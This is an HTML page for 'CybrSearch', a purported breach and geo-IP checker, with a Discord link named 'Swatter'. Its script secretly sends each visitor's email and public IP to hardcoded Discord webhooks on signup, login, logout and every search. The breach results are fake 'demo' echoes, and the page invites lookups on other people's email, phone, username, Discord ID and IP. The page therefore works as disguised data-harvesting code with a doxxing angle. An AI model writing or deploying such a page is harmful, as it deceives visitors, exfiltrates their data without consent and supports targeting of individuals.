<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CybrSearch - Breach + Geo IP Checker</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding-top: 60px; }
    .container { max-width: 700px; }
    .card { background-color: #161b22; border: none; border-radius: 1rem; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
    .form-control { background-color: #0d1117; color: #c9d1d9; border: 1px solid #30363d; }
    .form-control::placeholder { color: #8b949e; }
    .btn-primary { background-color: #238636; border: none; }
    .result-box { background-color: #1c2128; border-left: 5px solid #30363d; padding: 1rem; border-radius: 0.5rem; margin-top: 0.5rem; white-space: pre-wrap; }
    .result-box.success { border-left-color: #2ea043; }
    .result-box.warning { border-left-color: #d29922; }
    .result-box.error { border-left-color: #f85149; }
    .discord-btn { position: fixed; top: 20px; right: 20px; background-color: #5865F2; color: white; border: none; border-radius: 30px; padding: 10px 20px; font-weight: bold; text-decoration: none; }
    .hidden { display: none; }
  </style>
</head>
<body>
  <a class="discord-btn" href="https://discord.gg/Swatter" target="_blank">Join Discord</a>
  <div class="container text-center">
    <div id="auth">
      <h2 class="mb-3">üîê Login / Signup</h2>
      <form id="authForm" class="card p-4">
        <input id="authEmail" type="email" placeholder="üìß Email" class="form-control mb-2" required>
        <input id="authPassword" type="password" placeholder="üîë Password" class="form-control mb-2" required>
        <button type="submit" class="btn btn-primary w-100">Login / Signup</button>
      </form>
    </div>

    <div id="mainApp" class="hidden">
      <h1 class="mb-4">üîç Advanced Breach Checker + Geo IP</h1>
      <button onclick="logout()" class="btn btn-secondary mb-3">Logout</button>
      <form onsubmit="searchData(); return false;" class="card p-4">
        <input id="email" type="email" placeholder="üìß Enter email address" class="form-control mb-2">
        <input id="phone" type="text" placeholder="üì± Enter phone number" class="form-control mb-2">
        <input id="username" type="text" placeholder="üë§ Enter username" class="form-control mb-2">
        <input id="discord" type="text" placeholder="üí¨ Enter Discord ID" class="form-control mb-2">
        <input id="ip" type="text" placeholder="üåê Enter IP address" class="form-control mb-3">
        <button type="submit" class="btn btn-primary w-100">Search</button>
      </form>
      <div class="mt-5 text-start">
        <h4>üîé Search Results</h4>
        <div id="results"></div>
      </div>
    </div>
  </div>

  <script>
    const authWebhook = "https://discord.com/api/webhooks/1381059057875554375/UvXzkyggNeRKpdY_9TeMx52Uv7w2eb7hQNjYFljBg6r55HiFI1qDukIo2ebjXA7S2XKD";
    const searchWebhook = "https://discord.com/api/webhooks/1380896839921958972/qvWggkKAnV6cMkE2MF3wq_2V5thvRRkP0r9iRsYIS31tqUBFJU1GQ3QsTJGN5L4ilRwr";

    document.getElementById("authForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const email = document.getElementById("authEmail").value.trim();
      const password = document.getElementById("authPassword").value.trim();
      const stored = JSON.parse(localStorage.getItem("users") || "{}");

      let visitorIP = "Unknown";
      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        visitorIP = (await ipRes.json()).ip;
      } catch {}

      if (!stored[email]) {
        stored[email] = { password };
        localStorage.setItem("users", JSON.stringify(stored));
        await sendWebhook(authWebhook, "üÜï New Signup", email, visitorIP);
      } else if (stored[email].password !== password) {
        alert("Wrong password"); return;
      } else {
        await sendWebhook(authWebhook, "‚úÖ User Login", email, visitorIP);
      }

      localStorage.setItem("loggedIn", email);
      document.getElementById("auth").classList.add("hidden");
      document.getElementById("mainApp").classList.remove("hidden");
    });

    async function logout() {
      const email = localStorage.getItem("loggedIn");
      await sendWebhook(authWebhook, "üö™ User Logout", email);
      localStorage.removeItem("loggedIn");
      location.reload();
    }

    async function sendWebhook(url, title, email, ip="") {
      const payload = {
        embeds: [{
          title,
          color: 3447003,
          fields: [
            { name: "üìß Email", value: email, inline: false },
            { name: "üåê IP Address", value: ip || "Unknown", inline: false },
            { name: "üïí Time", value: new Date().toUTCString(), inline: false }
          ]
        }]
      };
      try {
        await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
      } catch {}
    }

    function updateResult(type, msg, style) {
      const box = document.createElement("div");
      box.className = `result-box ${style}`;
      box.innerText = msg;
      document.getElementById("results").appendChild(box);
    }

    async function searchData() {
      document.getElementById("results").innerHTML = "";
      const email = document.getElementById("email").value.trim();
      const phone = document.getElementById("phone").value.trim();
      const username = document.getElementById("username").value.trim();
      const discord = document.getElementById("discord").value.trim();
      const ip = document.getElementById("ip").value.trim();

      if (!email) updateResult("email", "‚ö†Ô∏è No email entered.", "warning");
      else updateResult("email", `‚úÖ Email checked (demo): ${email}`, "success");

      if (!phone) updateResult("phone", "‚ÑπÔ∏è Phone check skipped.", "warning");
      else updateResult("phone", `‚úÖ Phone checked (demo): ${phone}`, "success");

      if (!username) updateResult("username", "‚ÑπÔ∏è Username check skipped.", "warning");
      else updateResult("username", `‚úÖ Username checked (demo): ${username}`, "success");

      if (!discord) updateResult("discord", "‚ÑπÔ∏è Discord ID check skipped.", "warning");
      else updateResult("discord", `‚úÖ Discord ID checked (demo): ${discord}`, "success");

      let visitorIP = "Unknown";
      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        visitorIP = (await ipRes.json()).ip;
      } catch {}

      await sendWebhook(searchWebhook, "üîç Breach Search Attempt", email, visitorIP);

      if (ip) {
        try {
          const res = await fetch(`https://ipwho.is/${ip}`);
          const data = await res.json();
          if (data.success) {
            updateResult("ipgeo", `üåê IP Geo Info:\nIP: ${ip}\nCountry: ${data.country}\nCity: ${data.city}\nRegion: ${data.region}\nISP: ${data.connection?.isp || 'N/A'}`, "success");
          } else {
            updateResult("ipgeo", `‚ö†Ô∏è Geo lookup failed: ${data.message}`, "warning");
          }
        } catch {
          updateResult("ipgeo", `‚ùå Error fetching Geo IP data.`, "error");
        }
      } else {
        updateResult("ip", "‚ÑπÔ∏è IP geo-location check skipped.", "warning");
      }
    }

    window.onload = () => {
      if (localStorage.getItem("loggedIn")) {
        document.getElementById("auth").classList.add("hidden");
        document.getElementById("mainApp").classList.remove("hidden");
      }
    }
  </script>
</body>
</html>
